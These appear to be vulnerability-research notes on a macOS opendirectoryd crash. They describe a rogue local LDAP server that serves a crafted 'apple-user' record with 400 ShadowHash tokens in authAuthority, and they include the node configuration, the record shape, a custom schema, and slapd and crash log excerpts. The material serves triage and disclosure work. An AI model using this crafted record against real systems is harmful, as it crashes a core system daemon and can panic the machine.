# LDAP transcript and OD mapping notes

Collection note: this was a read-only evidence pass after the crash. I did not re-run
`dscl -authonly`, did not restart slapd, and did not modify opendirectoryd state.

## OD node mapping

`/Library/Preferences/OpenDirectory/Configurations/LDAPv3/127.0.0.1.plist`:

```text
node name: /LDAPv3/127.0.0.1
template: Open Directory Server
destination: 127.0.0.1:389 ldap
module options:
  AppleODClient:
    Server Mappings: true
  ldap:
    LDAP Referrals: false
    Use DNS replicas: false
    Denied SASL Methods: DIGEST-MD5
options:
  no cleartext authentication: false
  packet encryption: 0
  packet signing: 0
```

There was no local mapping table in the node plist. `Search.plist` and `Contacts.plist`
remained local-only (`/Local/Default`), so the repro used the explicit node path
`/LDAPv3/127.0.0.1`.

## LDAP-side record shape

The reliable Apple-style record was:

```text
dn: uid=victim,cn=users,dc=evil,dc=test
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: extensibleObject
objectClass: shadowAccount
objectClass: apple-user
uid: victim
cn: victim
sn: victim
uidNumber: 5556
gidNumber: 20
homeDirectory: /Users/victim
userPassword: pass123
authAuthority: ;DisabledTags;<400 comma-separated ShadowHash tokens>
```

There was also a root-level fallback record at `uid=victim,dc=evil,dc=test` with the same
`authAuthority` payload. The final OD mapping answer for the writeup should be:
server-mapping/Open Directory Server template plus the LDAP-served `apple-user` record,
not a local OD mapping override.

`/tmp/evilldap/custom.schema` only defined:

```text
objectclass ( 1.3.6.1.4.1.63.1000.1.1.2.16.100
    NAME 'apple-user' SUP top AUXILIARY
    MAY ( authAuthority ) )
```

## Transcript anchors

`/tmp/evilldap/fg389.log` shows the active slapd listener for the network repro:

```text
daemon_init: listen on ldap://127.0.0.1:389/
```

During the OD query, slapd loaded and returned the Apple-style victim entry:

```text
ldif_read_file: read entry file: "/tmp/evilldap/data/dc=evil,dc=test/cn=users/uid=victim.ldif"
dn: uid=victim
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: extensibleObject
objectClass: shadowAccount
objectClass: apple-user
authAuthority: ;DisabledTags;ShadowHash,ShadowHash,...
=> send_search_entry: conn 1000 dn="uid=victim,cn=users,dc=evil,dc=test"
```

The same log also shows the root-level fallback record being returned:

```text
ldif_read_file: read entry file: "/tmp/evilldap/data/dc=evil,dc=test/uid=victim.ldif"
dn: uid=victim
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: extensibleObject
authAuthority: ;DisabledTags;ShadowHash,ShadowHash,...
=> send_search_entry: conn 1000 dn="uid=victim,dc=evil,dc=test"
```

The unfolded `authAuthority` in `/tmp/evilldap/data/dc=evil,dc=test/uid=victim.ldif`
contains 400 comma-separated `ShadowHash` tokens. This is far beyond the six-entry inline
capacity identified in `static_oob_analysis.txt`.

Crash correlation is in `opendirectoryd_SIGSEGV_log_evidence.txt`; the first network repro line is:

```text
2026-06-11 19:35:47.363751-0400 launchd: [system/com.apple.opendirectoryd [90937]:] exited due to SIGSEGV
```

The later sandboxed-client run is captured in `network_ldap_sandbox_20260611T1938EDT/`:

```text
sandbox dscl rc=62
od before=77590 runs=11 crashes=10
od after=89292 runs=12 crashes=11 signal=Segmentation fault: 11
```

## Safety

Do not run further live crash triggers on this boot. Consecutive OD crashes can trigger
`_PanicOnCrash` / `PanicOnConsecutiveCrash`, and the daemon is already at
`runs=12`, `successive crashes=11`.
